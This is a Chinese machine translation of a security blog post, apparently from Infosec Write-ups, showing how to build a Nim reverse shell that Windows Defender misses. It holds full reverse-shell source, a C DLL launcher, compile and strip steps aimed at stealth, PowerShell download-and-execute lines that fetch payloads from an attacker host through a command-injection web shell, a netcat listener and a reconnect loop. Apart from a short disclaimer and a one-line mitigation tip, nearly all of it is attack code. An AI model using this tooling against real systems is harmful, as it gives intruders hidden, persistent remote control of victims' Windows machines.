<html>
<head>
<title>Use nim compiled language to evade Windows Defender reverse shell detection</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">使用nim编译语言规避Windows Defender反向外壳检测</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/use-nim-compiled-language-to-evade-windows-defender-reverse-shell-detection-a9268b4a3b0e?source=collection_archive---------4-----------------------#2022-12-16">https://infosecwriteups.com/use-nim-compiled-language-to-evade-windows-defender-reverse-shell-detection-a9268b4a3b0e?source=collection_archive---------4-----------------------#2022-12-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="4531" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">总结</strong></p><p id="2a46" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本文中，我们将向您展示如何规避Windows Defender反向外壳检测的另一种方法。我们将使用Josiah Pierce在他的文章<a class="ae kl" href="https://trustfoundry.net/2021/03/01/writing-basic-offensive-tooling-in-nim/." rel="noopener ugc nofollow" target="_blank">https://trust foundry . net/2021/03/01/writing-basic-offensive-tooling-in-nim/中描述的方法。</a></p><p id="0583" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">免责声明</strong></p><p id="6196" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这篇文章仅仅是为了信息和教育的目的，对于那些愿意和好奇去了解和学习安全和渗透测试的人来说。内容不得用于非法目的。如果你准备好学习新的好东西，那么继续读下去。</p><p id="de6a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">详情</strong></p><p id="8d87" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是另一个关于“隐形”交互外壳的博客。换句话说，就是Windows Defender软件检测不到的外壳。我将向您展示如何使用nim(一种编译语言)来创建未被发现的反向shell二进制文件。首先，我得把我的学分付给约西亚·皮尔斯。在这个概念验证中，我们将使用Josiah的源代码来构建我们的二进制文件。</p><p id="0a17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尼姆从2009年就存在了。对于构建Linux和Windows二进制文件来说，它仍然是一种相对不为人知的语言。不熟悉这种语言的好处是这些二进制文件不会被大多数反病毒公司发现。截至撰写本文时(2022年12月17日)，Windows Defender软件尚未检测到本文中的恶意二进制文件。</p><p id="4ff6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">除了Josiah Pierce的源代码之外，此PoC还包含:</p><p id="389a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">—用于Windows可执行文件(exe和dll)编译的x86和x64<br/>——一些Windows批处理文件“foo”将二进制文件传输到我们的目标<br/>——一些技巧以获得更稳定和交互式的外壳</p><p id="b0a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">POC由2台机器组成:受害者(完全更新的Windows 10)和攻击者(Kali Linux 2022.4版本)。我们只使用了微软的Windows Defender软件，并没有测试其他厂商的有效载荷。</p><p id="21b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">受害者:</p><p id="91f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">windows 10 Professional[版本10.0.19044.2364] <br/> IP地址:192.168.62.165 <br/>安全性:防病毒检测和防火墙规则的默认设置。<br/>软件:Xampp for Windows和OWASP Mutillidae易受攻击的web服务器。<br/>用户上下文:本地用户组成员中的POC用户。</p><p id="2083" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Windows 10安全仪表板:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/98ad11258b4e3771412a5de1abdea3a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BVTROBfQcszMvL9I2nnRrw.png"/></div></div></figure><p id="4f79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Windows安全配置设置:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ky"><img src="../Images/b3b8f2ec5a8ed5563a329436b4d2fac8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1004/format:webp/1*X7moYnqVK-mFkltRpQDFDQ.png"/></div></figure><p id="343d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击者:</p><p id="ac4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Kali Linux <br/> IP地址:192.168.62.161</p><p id="e5b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">初始立足点:</p><p id="31ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们最初的立足点是一个带有cmd注入漏洞的PHP web shell。</p><p id="844b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kz"> 127.0.0.1 &amp; &amp; &lt;命令&gt; </em></p><p id="1a44" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，我们可以使用web shell来执行“whoami”命令:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi la"><img src="../Images/14f4bd1194f689820ce34965c30a2e7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dgvlp84i-sEl9ElOCPAT8w.png"/></div></div></figure><h1 id="796b" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">准备PoC环境</h1><p id="dbae" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">在编译我们的二进制文件之前，我们必须更新我们的Kali攻击机器。</p><ol class=""><li id="aa7d" class="me mf iq jp b jq jr ju jv jy mg kc mh kg mi kk mj mk ml mm bi translated">在192.168.62.161上执行(攻击者机器，Kali Linux)。</li></ol><p id="3fb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">安装mingw-64和nim。</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="2a74" class="ms lc iq mo b be mt mu l mv mw">sudo apt install mingw-w64 <br/>sudo apt install nim</span></pre><p id="2fd5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">安装额外的支持工具</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="d50c" class="ms lc iq mo b be mt mu l mv mw">sudo apt install rlwrap<br/>sudo apt install gedit</span></pre><h1 id="6584" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">创建二进制文件</h1><p id="4c5d" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">2.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="0534" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从<a class="ae kl" href="https://trustfoundry.net/2021/03/01/writing-basic-offensive-tooling-in-nim/" rel="noopener ugc nofollow" target="_blank">https://trust foundry . net/2021/03/01/writing-basic-offensive-tooling-in-nim/</a>下载nim源代码，将代码保存在/tmp/reverse_shell.nim</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="2821" class="ms lc iq mo b be mt mu l mv mw">gedit /tmp/reverse_shell.nim</span></pre><p id="45a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在/tmp/reverse_shell.nim中复制并粘贴下面的代码</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="b799" class="ms lc iq mo b be mt mu l mv mw">import net<br/>import osproc # this comes with execProcess, which returns the output of the command as a string<br/>import os<br/>import strutils<br/> <br/># these are the default connection parameters for the rev shell, but can be overwritten with command-line args<br/>var ip = "127.0.0.1"<br/>var port = 4444<br/><br/>var args = commandLineParams() # returns a sequence (similar to a Python list) of the CLI arguments<br/> <br/># if arguments have been provided, assume they are an IP and port and overwrite the default IP/port values<br/>if args.len() == 2:<br/>    ip = args[0]<br/>    port = parseInt(args[1])<br/> <br/># begin by creating a new socket<br/>var socket = newSocket()<br/>echo "Attempting to connect to ", ip, " on port ", port, "..."<br/><br/>while true:<br/># attempt to connect to the attacker's host<br/>    try:<br/>        socket.connect(ip, Port(port))<br/>        <br/>        # if the connection succeeds, begin the logic for receiving and executing commands from the attacker<br/>        while true:<br/>            try:<br/>               <br/>                socket.send("&gt; ")<br/>                var command = socket.recvLine() # read in a line from the attacker, which should be a shell command to execute<br/>                var result = execProcess(command) # execProcess() returns the output of a shell command as a string<br/>                socket.send(result) # send the results of the command to the attacker<br/>            <br/>            # if the attacker forgets they're in a rev shell and tries to ctrl+c, which they inevitably will, close the socket and quit the program    <br/>            except:<br/>                echo "Connection lost, quitting..."<br/>                socket.close()<br/>                system.quit(0)<br/><br/># if the connection fails, wait 10 seconds and try again        <br/>    except:<br/>        echo "Failed to connect, retrying in 10 seconds..."<br/>        sleep(10000) # note that sleep() takes its argument in milliseconds, at least by default<br/>        continue</span></pre><p id="a8b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了完整起见，我们向您展示如何编译x86和x64二进制文件。其实x86就够了。这是因为32位可执行文件可以在x86和x64架构上运行。</p><p id="e6f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="7a59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将nim源代码编译成Windows x86 en x64反向shell exe二进制文件。</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="699b" class="ms lc iq mo b be mt mu l mv mw"># 32bits compilation<br/>nim c -d:mingw --cpu:i386 -t:-m32 -l:-m32 /tmp/reverse_shell.nim <br/>mv /tmp/reverse_shell.exe /tmp/rev-x86.exe  <br/><br/># 64bits compilation<br/>nim c -d:mingw --cpu:amd64 /tmp/reverse_shell.nim <br/>mv /tmp/reverse_shell.exe /tmp/rev-x64.exe</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi mx"><img src="../Images/f8089df327a0a58640113230d140caa9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iWIxtkDwpXxRGOlHSAC9Ig.png"/></div></div></figure><p id="ecc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了更加隐蔽，将删除调试符号。这也将把文件大小减少到大约220千字节。</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="7f72" class="ms lc iq mo b be mt mu l mv mw">strip /tmp/rev-x86.exe<br/>strip /tmp/rev-x64.exe</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi my"><img src="../Images/3bed06ee72ef2852a9eb3105816af179.png" data-original-src="https://miro.medium.com/v2/resize:fit:474/format:webp/1*WmIcKhXU01KviPgGCPIDzw.png"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">使用strip命令移除调试符号</figcaption></figure><p id="7f36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有时你需要一个. dll文件(例如著名的PrintNightmare漏洞)。不幸的是，我没有成功地使用nim编译器创建Windows dll文件。如果你能做到这一点，请让我知道，我会更新这篇文章。好资源:<a class="ae kl" href="https://github.com/byt3bl33d3r/OffensiveNim#creating-windows-dlls-with-an-exported-dllmain" rel="noopener ugc nofollow" target="_blank">https://github . com/byt 3 bl 33d 3 r/offensive nim # creating-windows-dll-with-an-exported-dllmain</a></p><p id="548e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">或者，我们会用C来编译Windows .dll，实际上dll文件只会执行命令<em class="kz">C:\ Windows \ Tasks \ rev-x86 . exe&lt;LHOST&gt;&lt;LPORT&gt;。</em>这意味着您需要同时使用。dll和。exe文件。</p><p id="02e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="db8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">创建C源代码，用于编译一个Windows。dll二进制文件。</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="4dfc" class="ms lc iq mo b be mt mu l mv mw">LHOST=192.168.62.161<br/>LPORT=443<br/>cd /tmp<br/>echo "#include &lt;windows.h&gt;" &gt; testdll.c<br/>echo "BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {" &gt;&gt; testdll.c<br/>echo "if (dwReason == DLL_PROCESS_ATTACH) {" &gt;&gt; testdll.c<br/>echo "system(\"START /B C:\\\\\\Windows\\\\\\Tasks\\\\\\\\rev-x86.exe ${LHOST} ${LPORT}\"); "&gt;&gt; testdll.c<br/>echo "ExitProcess(0);" &gt;&gt; testdll.c<br/>echo "} "&gt;&gt; testdll.c<br/>echo "return TRUE;" &gt;&gt; testdll.c<br/>echo "}" &gt;&gt; testdll.c</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi nd"><img src="../Images/6d534132d956280acf90078dd44aa017.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k31N-qr3zAUHzZK6t8ogaw.png"/></div></div></figure><p id="98af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="b8ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将C源代码编译成Windows x86 en x64 reverse shell。dll二进制文件。</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="db89" class="ms lc iq mo b be mt mu l mv mw"># x86<br/>i686-w64-mingw32-gcc testdll.c -shared -o /tmp/rev-x86.dll<br/><br/># x64<br/>x86_64-w64-mingw32-gcc testdll.c -shared -o /tmp/rev-x64.dll</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/d00f037645bb7e705095d4395766f038.png" data-original-src="https://miro.medium.com/v2/resize:fit:988/format:webp/1*5rmlXv7T_MFT3iOhafyNpQ.png"/></div></figure><h1 id="b6da" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">将二进制文件传输到目标</h1><p id="828b" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">下一步是将Windows二进制文件转移到目标Windows 10计算机上。因为起点是通过web shell远程执行代码，所以我们还不能交互式访问我们的目标。为了传输文件，我们需要利用‘命令执行’漏洞。</p><p id="c4fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将分两步转移文件:</p><ul class=""><li id="d7ad" class="me mf iq jp b jq jr ju jv jy mg kc mh kg mi kk nf mk ml mm bi translated">向批处理文件添加复制命令(backup.bat) <br/> -下载并执行批处理文件</li></ul><p id="7803" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将把are文件复制到始终可用且可写的目标目录C:\Windows\Tasks。</p><p id="6471" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">6.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="cf96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">创建包含PowerShell复制文件命令的Windows批处理文件。我们将继续使用32位版本。</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="6b98" class="ms lc iq mo b be mt mu l mv mw">LHOST=192.168.62.161<br/>LPORT_web=80<br/>file1=rev-x86.dll<br/>file2=rev-x86.exe<br/>echo START /B powershell -c "(New-Object System.Net.Webclient).DownloadFile('http://${LHOST}:${LPORT_web}/${file1}','C:\Windows\Tasks\\\\${file1}')" &gt; /tmp/backup.bat<br/>echo START /B powershell -c "(New-Object System.Net.Webclient).DownloadFile('http://${LHOST}:${LPORT_web}/${file2}','C:\Windows\Tasks\\\\${file2}')" &gt;&gt; /tmp/backup.bat</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi ng"><img src="../Images/07390056348d7b0b9e5638c6608cd94a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pXYG7CkikodT-qkHNLWYSA.png"/></div></div></figure><p id="6ca4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">7.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="f2e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">启动Python web服务器来存放我们的反向shell文件和backup.bat。</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="926b" class="ms lc iq mo b be mt mu l mv mw">python3 -m http.server 80 --directory /tmp</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/c5ea6abef1a9180a51308eb64832ad4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:884/format:webp/1*7xrCVUwlfL3wwWNymkEXwg.png"/></div></figure><p id="538f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">8.在192.168.62.165上执行(受害计算机，Windows 10 web shell)</p><p id="a768" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用“命令执行”漏洞下载并执行backup.bat，然后下载我们的Windows x86反向外壳二进制文件(rev-x86.dll rev-x86.exe)</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="3ea5" class="ms lc iq mo b be mt mu l mv mw">START /B powershell.exe -c (New-Object System.Net.Webclient).DownloadFile('http://192.168.62.161:80/backup.bat','C:\Windows\Tasks\backup.bat');IEX 'c:\Windows\Tasks\backup.bat'</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi ni"><img src="../Images/8a08988eb0b89ae2b6210e1ea2b7590d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g9pDcJF2GOsMPllTx31aWQ.png"/></div></div></figure><p id="c78c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查python web服务器:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/a89c3beacae39bf99a791cf2fbfabd42.png" data-original-src="https://miro.medium.com/v2/resize:fit:1212/format:webp/1*gB58lorm7rCHyhgDEsC2Xw.png"/></div></figure><h1 id="b8c0" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">执行二进制文件并建立反向shell</h1><p id="00e7" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">既然我们已经将必要的文件复制到了目标机器上，我们可以尝试执行它们，并与我们的攻击机器建立一个反向shell。我们将使用两种机制来使这个外壳更加稳定和具有交互性:</p><p id="15c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-rl wrap(sudo apt install rl wrap)<br/>-while循环</p><p id="eb9a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">9.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="306c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">启动netcat监听器(端口443)。使用rlwrap获得“doskey”感觉。</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="7f27" class="ms lc iq mo b be mt mu l mv mw">while; do rlwrap nc -nlvp 443 ; done</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="ab gu cl nk"><img src="../Images/6971e244663ae142ff91d22096f80118.png" data-original-src="https://miro.medium.com/v2/format:webp/1*lUtA6c1WiOsosztMv9JRzA.png"/></div></figure><p id="8506" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">10.在192.168.62.165上执行(受害计算机，Windows 10 web shell)</p><p id="1bfb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">利用“命令执行”漏洞执行二进制文件并建立反向外壳。我们可以使用一个永恒的for循环来使这个shell更加稳定:</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="757c" class="ms lc iq mo b be mt mu l nl mw">c:\Windows\Tasks\rev-x86.exe 192.168.62.161 443</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/97ec0853a80eba8f47c95771aa92b622.png" data-original-src="https://miro.medium.com/v2/resize:fit:1064/format:webp/1*QuK_xCkrCr9OjUZjZPnd_g.png"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">我们有一个反向外壳连接！</figcaption></figure><p id="4c40" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">备选方案:</p><p id="275f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在自动重新连接的循环中添加目标命令。</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="59ea" class="ms lc iq mo b be mt mu l mv mw">FOR /L %L IN (0,0,1) DO @(timeout /t 2 /nobreak &gt;nul &amp;&amp; c:\Windows\Tasks\rev-x86.exe 192.168.62.161 443)</span></pre><p id="8170" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">10b。在192.168.62.165上执行(受害机器，Windows 10 web shell)。</p><p id="3eab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于某些攻击，您需要一个Windows dll。可以在Windows命令行上用rundll32 <command>、<function>执行dll。</function></command></p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="33ba" class="ms lc iq mo b be mt mu l mv mw">c:\Windows\Tasks\rundll32 rev-x86.dll,test</span></pre><h1 id="46e7" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">远程命令执行</h1><p id="05d8" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">为了使用这个shell，您必须执行带有前缀“cmd /c”或“powershell -c”的命令。例如cmd /c whoami或powershell-c“whoami”</p><p id="aa92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">11.在192.168.62.165上执行(受害机，交互反壳)。</p><pre class="kn ko kp kq gt mn mo mp bn mq mr bi"><span id="a02b" class="ms lc iq mo b be mt mu l mv mw">cmd /c "dir c:\"<br/>powershell -c "whoami"</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/65d81bbaad4837ed6f652d625895c4b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:900/format:webp/1*_zPE6BaqSTZgeoiOxcAqxA.png"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">使用命令前缀“cmd /c”或“powershell -c”。</figcaption></figure><h1 id="d5ce" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">病毒总量分析</h1><p id="3aed" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">当我们将我们的(稍微修改的)rev-x86.exe文件加载到virustotal中时，我们得到了71个检测中的5个(7%)。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi no"><img src="../Images/d9e93931736dac57947f98df21eae490.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a9SGKbBA0e0SCGAboVBZxg.png"/></div></div></figure><p id="bf7c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">缓解建议</strong></p><p id="b678" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">反病毒软件供应商迟早会检测到注入的可执行文件。在撰写本文时(2022年12月16日)，Windows防病毒软件未检测到编译二进制文件。很可能在不久的将来会。您可以通过更新防病毒软件来缓解这一问题。</p><p id="7c82" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">学分</strong></p><p id="401f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">约西亚·皮尔斯(<a class="ae kl" href="https://trustfoundry.net/author/josiah/" rel="noopener ugc nofollow" target="_blank">https://trustfoundry.net/author/josiah/</a>)</p></div><div class="ab cl np nq hu nr" role="separator"><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu"/></div><div class="ij ik il im in"><h2 id="9c02" class="nw lc iq bd ld nx ny dn lh nz oa dp ll jy ob oc lp kc od oe lt kg of og lx oh bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kl" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>